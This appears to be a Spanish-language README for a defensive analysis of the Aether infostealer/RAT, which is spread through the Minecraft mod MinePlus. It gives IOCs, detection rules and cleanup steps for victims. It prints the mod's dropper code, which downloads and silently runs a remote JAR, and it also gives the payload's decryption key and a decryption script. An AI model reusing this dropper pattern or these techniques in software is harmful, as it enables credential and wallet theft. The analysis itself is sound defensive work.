# aether-decrypted-malware

> Análisis estático del stealer/RAT **Aether**, distribuido a través del mod de Minecraft **MinePlus** (Fabric).

Este repositorio contiene **solo documentación, IOCs y herramientas de análisis defensivo**. No incluye binarios del malware ni código funcional del atacante.

---

## ⚠️ Aviso

Este repositorio es **solo para investigación defensiva y educación**. Su objetivo es:

- Ayudar a otros analistas a reconocer la amenaza
- Facilitar la creación de detecciones (YARA, Sigma, Suricata)
- Permitir a las víctimas entender qué les robaron y cómo limpiar sus sistemas
- Reportar la infraestructura del atacante a los proveedores

**No se incluye ni se incluirá:**

- Binarios del malware (`aether.jar`, `p.bin`, `stage3_inner.jar`, `fappbound.dll`, etc.)
- Código fuente completo del stealer (solo fragmentos citados)
- Herramientas para operar, redistribuir o modificar el malware
- Datos robados de víctimas

Si eres víctima, lee [Qué hacer si estás infectado](#qué-hacer-si-estás-infectado).

---

## Índice

- [Resumen](#resumen)
- [Cadena de infección](#cadena-de-infección)
- [Capacidades](#capacidades)
- [IOCs](#iocs)
- [Análisis técnico](#análisis-técnico)
- [Detecciones](#detecciones)
- [Qué hacer si estás infectado](#qué-hacer-si-estás-infectado)
- [Reportar](#reportar)
- [Licencia](#licencia)

---

## Resumen

**Aether** es un **infostealer + RAT** para usuarios de Minecraft, distribuido mediante el mod de Fabric **MinePlus**. El mod descarga `aether.jar`, lo descifra en memoria y ejecuta un stealer completo con control remoto.

| Campo | Valor |
|-------|-------|
| Familia | Aether Stealer v2 |
| Vector | Mod Fabric "MinePlus" |
| Panel C2 | `https://aether-panel.vercel.app` |
| Relay RAT | `wss://screen-relay.abelbiffle.workers.dev` |
| SHA256 `aether.jar` | `B3BF2C573032623E31129389BDDEF7CD81010D571F41DBF14C53AB4094456EFD` |
| Tamaño stage 3 | ~24 MB (4608 archivos) |
| Stack | Java 17+ / Kotlin (OkHttp, Okio) |

---

## Cadena de infección

```
1. Víctima instala el mod MinePlus en %APPDATA%\.minecraft\mods\
        ↓
2. MixinLoader (al iniciar Minecraft):
   - Lee /bid y /api de sus recursos
   - Descarga aether.jar desde <api>/api/downloads?file=aether.jar
   - Ejecuta: java -jar aether.jar <buildId> <apiUrl>
        ↓
3. Loader (stage 2):
   - Anti-debug (aborta si detecta JDWP)
   - Deriva clave AES-256 (XOR + LCG)
   - Descifra p.bin (AES-256-GCM)
   - Descomprime GZIP → JAR interno
   - Carga en memoria con ClassLoader custom (Z.java)
   - Ejecuta aether.Main.main(args)
        ↓
4. Stealer/RAT (stage 3):
   - GET <api>/api/config/<buildId>  → el panel decide qué robar
   - Instala persistencia en Startup de Windows
   - 8 hilos de recolección en paralelo
   - 5 WebSockets al relay RAT (screen, webcam, mic, files, cmd)
   - POST <api>/api/relay/<buildId> con ZIP de datos
   - Clipper de crypto en portapapeles
```

---

## Capacidades

### Robo de datos

| Categoría | Qué roba | Gravedad |
|-----------|----------|----------|
| Navegadores | Cookies, contraseñas, historial, autofills, tarjetas, bookmarks | 🔴 Crítico |
| Discord | Tokens + email, teléfono, Nitro, billing | 🔴 Crítico |
| Minecraft | Sesión Microsoft/Mojang | 🔴 Crítico |
| Steam | Credenciales + SSFN (bypass 2FA) | 🔴 Crítico |
| Roblox | Cookies + cuenta | 🔴 Crítico |
| Telegram | `tdata/` (sesión completa) | 🔴 Crítico |
| WhatsApp | Archivos de sesión | 🔴 Crítico |
| Wallets | MetaMask, Exodus, Electrum, Atomic, Jaxx, Coinomi, Wasabi, Armory, Zcash | 🔴 Crítico |
| FileZilla | Servidores FTP con contraseñas | 🔴 Crítico |
| Redes sociales | Instagram, TikTok, Spotify, Reddit | 🟠 Alto |
| Gaming | Battle.net, Ubisoft, EA, Rockstar, Epic, Riot, Growtopia | 🟠 Alto |
| Sistema | Hostname, user, OS, CPU, GPU, RAM, IPs, MAC, AV, VM | 🟡 Medio |
| Portapapeles | Contenido actual | 🟠 Alto |
| VPN | Configs | 🟠 Alto |
| Archivos | Rutas configurables por el panel | 🔴 Crítico |

### Control remoto (RAT)

| Canal | Función |
|-------|---------|
| `t=screen` | Streaming de pantalla + control de mouse/teclado |
| `t=webcam` | Streaming de webcam |
| `t=mic` | Streaming de micrófono |
| `t=files` | Explorador de archivos + descarga |
| `t=cmd` | Shell remoto (RCE) |

### Otras capacidades

- **Clipper**: reemplaza direcciones cripto en el portapapeles
- **Persistencia**: auto-arranque con `--startup`
- **Anti-VM**: aborta si detecta VM (activable por el panel)
- **Anti-debug**: aborta si detecta JDWP
- **Camuflaje**: modo `game` abre Minecraft web en kiosco; modo `error` muestra falso error de Windows

---

## IOCs

### Red

| Tipo | Valor |
|------|-------|
| URL | `https://aether-panel.vercel.app` |
| URL | `wss://screen-relay.abelbiffle.workers.dev` |
| URL | `https://mineplay.io/eaglercraft/1.8.8-js/index.html` (señuelo) |
| Endpoint | `<base>/api/config/<buildId>` (GET) |
| Endpoint | `<base>/api/relay/<buildId>` (POST) |
| WebSocket | `wss://<relay>/?id=<buildId>&t=screen` |
| WebSocket | `wss://<relay>/?id=<buildId>&t=webcam` |
| WebSocket | `wss://<relay>/?id=<buildId>&t=mic` |
| WebSocket | `wss://<relay>/?id=<buildId>&t=files` |
| WebSocket | `wss://<relay>/?id=<buildId>&t=cmd` |

### Archivos

| Ruta | Descripción |
|------|-------------|
| `%APPDATA%\.minecraft\mods\MinePlus*.jar` | Mod dropper |
| `%TEMP%\mp_*.jar` | JAR temporal del loader |
| `fappbound.dll` | DLL inyectada en Chrome/Edge |

### Persistencia

| Ubicación | Descripción |
|-----------|-------------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Auto-arranque |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Auto-arranque |
| `%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Auto-arranque (all users) |

### Otros

- **Hash**: `B3BF2C573032623E31129389BDDEF7CD81010D571F41DBF14C53AB4094456EFD`
- **Alias**: `abelbiffle` (subdominio workers.dev)
- **Build IDs**: `TEST` (dev), `12345` (ejemplo)

---

## Análisis técnico

### Stage 1 — Mod MinePlus (Fabric)

`MixinLoader.java` implementa `net.fabricmc.api.ModInitializer`:

```java
public void onInitialize() {
    Thread t = new Thread(this::doLoad, "mp-loader");
    t.setDaemon(true);
    t.start();
}

private static void doLoad() throws Exception {
    String bid = rd("/bid");          // build ID
    String api = rd("/api");          // base URL
    if (bid.isEmpty() || api.isEmpty()) return;

    File f = File.createTempFile("mp_", ".jar");
    f.deleteOnExit();
    String url = api + "/api/downloads?file=aether.jar";
    dl(url, f, 5);                    // descarga con redirects

    String javaHome = System.getProperty("java.home");
    File java = new File(javaHome, "bin/javaw.exe");
    if (!java.exists()) java = new File(javaHome, "bin/java");

    new ProcessBuilder(java.getAbsolutePath(), "-jar",
        f.getAbsolutePath(), bid, api)
        .inheritIO().start();
}
```

**Observaciones:**

- Descarga sin verificar hash ni firma
- Usa `javaw.exe` para ocultar la consola
- Pasa `bid` y `api` como `args[0]` y `args[1]`

### Stage 2 — Loader cifrado

`aether.jar` contiene `Loader.class`, `Z.class` y `p.bin`. El `Loader`:

1. **Anti-debug**: aborta si detecta `jdwp`, `-agentlib`, `-Xrunjdwp` o `debugger`
2. **Deriva clave AES-256**:

   ```
   key[i] = (base[i] ^ (byte)(lcgNext() >>> 40)) & 0xFF
   base   = _d[i] ^ _p[i]
   LCG    = seed * 6364136223846793005 + 1442695040888963407
   ```

3. **Descifra `p.bin`**: AES-256-GCM, IV = primeros 12 bytes, tag 128 bits
4. **Descomprime GZIP** → JAR interno
5. **Carga en memoria** con `Z` (ClassLoader custom, sin tocar disco)
6. **Ejecuta** `aether.Main.main(args)`

**Clave AES del sample** (derivada, no embebida en claro):

```
09321e68aa3cec64b0cd69e09dad41e72f869e16d9e3c0a6b983b656d58bfe6d
```

### Stage 3 — Stealer/RAT

`aether.Main` es el orquestador. Estructura:

```
aether/
├── Main.class                 ← orquestador
├── Config.class               ← carga features desde el panel
├── Config$Features.class      ← flags de robo
├── browser/
│   ├── AbeInjector.class      ← bypass App-Bound Encryption (Chrome ≥127)
│   ├── DpapiDecryptor.class   ← DPAPI para credenciales
│   └── Win32Abe.class         ← bindings JNA para inyección
└── x.a … x.aj                 ← ~150 clases ofuscadas
    ├── Recolectores
    ├── Cliente C2 (OkHttp)
    ├── RAT (5 canales WebSocket)
    └── Utilidades (crypto, HWID, JSON, fs)
```

**Dependencias legítimas (repackaged):**

- `com.sun.jna` — acceso nativo Windows
- `org.sqlite` — leer SQLite de navegadores
- `okhttp3` / `okio` — HTTP/WebSocket
- `com.github.sarxos.webcam` — captura de webcam
- `org.bridj` — FFI nativo
- `com.google.gson` — JSON
- `org.conscrypt` — TLS
- `kotlin` — stdlib

**Configuración remota**: `Config.load(base, buildId)` hace `GET <base>/api/config/<buildId>` y recibe JSON con los features. El panel decide **en runtime** qué roba cada bot.

**Persistencia**: si `features.startup` es true y no se arrancó con `--startup`, llama a `i.a(buildId, base)` que instala el auto-arranque.

**Camuflaje:**

- `launchMode = "game"` → abre `mineplay.io/eaglercraft` en kiosco fullscreen
- `launchMode = "error"` → muestra falso error de Windows (`0xc000007b`)

---

## Proceso de descifrado

Script de referencia (Python) que replica la lógica del loader **sin ejecutar Java**:

```python
# decrypt.py — análisis estático, NO ejecuta el JAR
import gzip, zipfile, io
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

_d = bytes([...])   # constante del Loader
_p = bytes([...])   # constante del Loader
_s = 5873147793032940592

# Derivar clave
base = bytes(a ^ b for a, b in zip(_d, _p))
out = bytearray(32)
state = _s & 0xFFFFFFFFFFFFFFFF
for i in range(32):
    state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
    out[i] = base[i] ^ ((state >> 40) & 0xFF)
aes_key = bytes(out)

# Descifrar p.bin
raw = open("p.bin", "rb").read()
iv, ct = raw[:12], raw[12:]
plain = AESGCM(aes_key).decrypt(iv, ct, None)

# GUNZIP → ZIP/JAR
zipped = gzip.decompress(plain)
with zipfile.ZipFile(io.BytesIO(zipped)) as z:
    z.extractall("stage3")
```

**Decompilación del stage 3:**

```powershell
java -jar cfr.jar stage3_inner.jar --outputdir stage3_src
# o
jadx stage3_inner.jar -d stage3_src
```

---

## Detecciones

### YARA

```yara
rule Aether_Loader_Java
{
    meta:
        description = "Aether stage-2 loader (aether.jar)"
        author = "aether-decrypted-malware"
    strings:
        $c1 = "p.bin" ascii wide
        $c2 = "AES/GCM/NoPadding" ascii wide
        $c3 = "Aether" ascii wide
        $m2 = "Main-Class: Loader" ascii
    condition:
        $m2 and 2 of ($c1, $c2, $c3)
}

rule Aether_Stage3_Strings
{
    meta:
        description = "Aether stage-3 stealer (inner JAR)"
        author = "aether-decrypted-malware"
    strings:
        $s1 = "aether-panel.vercel.app" ascii wide
        $s2 = "screen-relay.abelbiffle.workers.dev" ascii wide
        $s3 = "Browsers/" ascii
        $s4 = "Discord/tokens.txt" ascii
        $s5 = "Minecraft/accounts.txt" ascii
        $s6 = "Wallets/" ascii
        $s7 = "fappbound.dll" ascii wide
    condition:
        3 of them
}
```

### Sigma (persistencia Windows)

```yaml
title: Aether Persistence via Run Key
id: 7f3c2a1b-4d5e-4f6a-8b9c-0d1e2f3a4b5c
status: experimental
description: Detecta auto-arranque de Aether/MinePlus en Run key
logsource:
  product: windows
  category: registry_set
detection:
  selection_key:
    TargetObject|endswith: '\Software\Microsoft\Windows\CurrentVersion\Run\*'
  selection_value:
    Details|contains:
      - 'aether'
      - 'mp_'
      - '--startup'
  condition: selection_key and selection_value
falsepositives:
  - Software legítimo con nombres similares
level: high
```

### Suricata

```
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Aether C2 panel access";
  http.host; content:"aether-panel.vercel.app";
  sid:1000001; rev:1;
)

alert tls $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Aether RAT relay (Cloudflare Workers)";
  tls.sni; content:"screen-relay.abelbiffle.workers.dev";
  sid:1000002; rev:1;
)
```

### Firewall (Windows)

```powershell
New-NetFirewallRule -DisplayName "Block Aether Panel" `
    -Direction Outbound -Action Block `
    -RemoteAddress "aether-panel.vercel.app"

New-NetFirewallRule -DisplayName "Block Aether RAT Relay" `
    -Direction Outbound -Action Block `
    -RemoteAddress "screen-relay.abelbiffle.workers.dev"
```

---

## Qué hacer si estás infectado

Si instalaste el mod **MinePlus** o ejecutaste `aether.jar` en tu PC real (no en una VM):

### 1. Desconecta de la red

```powershell
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
```

### 2. Bloquea la infraestructura del atacante

```powershell
New-NetFirewallRule -DisplayName "Block Aether Panel" `
    -Direction Outbound -Action Block `
    -RemoteAddress "aether-panel.vercel.app"

New-NetFirewallRule -DisplayName "Block Aether RAT Relay" `
    -Direction Outbound -Action Block `
    -RemoteAddress "screen-relay.abelbiffle.workers.dev"
```

### 3. Detén y elimina el malware

```powershell
# Procesos Java sospechosos
Get-Process java,javaw -ErrorAction SilentlyContinue | Select-Object Id, Path, StartTime
Stop-Process -Name java,javaw -Force -ErrorAction SilentlyContinue

# Mod original
Remove-Item "$env:APPDATA\.minecraft\mods\MinePlus*.jar" -Force -ErrorAction SilentlyContinue

# Archivos temporales del loader
Remove-Item "$env:TEMP\mp_*.jar" -Force -ErrorAction SilentlyContinue
```

### 4. Elimina la persistencia

```powershell
# Revisa a mano
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Si encuentras entradas sospechosas:
# Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "NombreMalo"
# Remove-Item "ruta\al\archivo" -Force
```

### 5. Cambia TODAS las credenciales

| Servicio | Acción |
|----------|--------|
| Microsoft / Minecraft | Cambiar contraseña + 2FA + cerrar sesiones |
| Discord | Cambiar contraseña + Dispositivos → Cerrar todas |
| Steam | Cambiar contraseña + revocar sesiones Steam Guard |
| Roblox | Cambiar contraseña + cerrar sesiones |
| Telegram | Dispositivos → Terminar todas las sesiones |
| WhatsApp | WhatsApp Web → Cerrar todas las sesiones |
| Instagram / TikTok / Spotify / Reddit | Cambiar contraseña + cerrar sesiones |
| Battle.net / Ubisoft / EA / Rockstar / Epic / Riot | Cambiar contraseña + 2FA |
| FileZilla | Cambiar contraseñas de FTP |
| Navegadores | Cambiar TODAS las contraseñas guardadas |
| Tarjetas de crédito | Cancelar las guardadas en el navegador |
| Wallets cripto | Mover fondos a wallet nueva en dispositivo limpio |
| VPN | Rotar configs |
| Windows | Cambiar contraseña de usuario |

### 6. Revisa tus cuentas

- **Steam**: transacciones o trades pendientes
- **Discord**: servidores, mensajes, compras de Nitro
- **Minecraft**: bans o actividad
- **Roblox**: Robux gastados, items transferidos
- **Wallets**: transacciones no reconocidas

### 7. Reporta

- **Vercel**: https://vercel.com/abuse → `aether-panel.vercel.app`
- **Cloudflare**: https://abuse.cloudflare.com/ → `screen-relay.abelbiffle.workers.dev`
- **VirusTotal**: hash `B3BF2C57...`
- **CurseForge / Modrinth**: si el mod está publicado
- **GitHub**: si el mod o el panel están en repos públicos

---

## Reportar

| IOC | Dónde reportar |
|-----|----------------|
| `https://aether-panel.vercel.app` | https://vercel.com/abuse |
| `wss://screen-relay.abelbiffle.workers.dev` | https://abuse.cloudflare.com/ |
| Hash `B3BF2C573032623E31129389BDDEF7CD81010D571F41DBF14C53AB4094456EFD` | https://www.virustotal.com/ |
| Mod "MinePlus" | CurseForge / Modrinth / GitHub |
| Alias `abelbiffle` | GitHub, Cloudflare |

---

## Estructura del repositorio

```
aether-decrypted-malware/
├── README.md
├── LICENSE
├── docs/
│   ├── infection-chain.md
│   ├── stage1-mixinloader.md
│   ├── stage2-loader.md
│   ├── stage3-main.md
│   ├── capabilities.md
│   └── iocs.md
├── tools/
│   ├── decrypt.py
│   ├── honeypot_c2.py
│   └── extract_iocs.py
├── detections/
│   ├── yara/
│   │   ├── aether_loader.yar
│   │   └── aether_stage3.yar
│   ├── sigma/
│   │   └── aether_persistence.yml
│   └── suricata/
│       └── aether.rules
└── samples/
    └── README.md   ← NO incluye binarios, solo hashes
```

---

## Referencias

- [CyberChef](https://gchq.github.io/CyberChef/) — descifrado AES-GCM en navegador
- [CFR](https://www.benf.org/other/cfr/) — decompilador Java
- [jadx](https://github.com/skylot/jadx) — decompilador Java/Android
- [JNA](https://github.com/java-native-access/jna) — Java Native Access
- [OkHttp](https://square.github.io/okhttp/) — cliente HTTP/WebSocket
- [App-Bound Encryption](https://chromium.googlesource.com/chromium/src/+/main/docs/security/app-bound-encryption.md) — Chromium
- [Fabric](https://fabricmc.net/) — loader de mods de Minecraft

### Familias relacionadas

- **LummaC2** — bypass de App-Bound Encryption
- **Vidar** — stealer con C2 HTTP
- **StealC** — stealer modular
- **Raccoon v2** — stealer con panel web
- **RedLine** — stealer con clipper

---

## Licencia

**CC BY-NC-SA 4.0** — Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International.

Puedes compartir y adaptar el material bajo estas condiciones:

- **Atribución** — dar crédito apropiado
- **NoComercial** — no usar con fines comerciales
- **CompartirIgual** — distribuir contribuciones bajo la misma licencia

Ver `LICENSE` para el texto completo.

---

## Contacto

Si eres investigador, analista o víctima y quieres contribuir:

- Abre un **issue** (sin binarios ni datos de víctimas)
- Abre un **pull request** con detecciones o documentación
- Para reportes sensibles, contacta a los mantenedores por separado

**No envíes muestras de malware a este repositorio.**
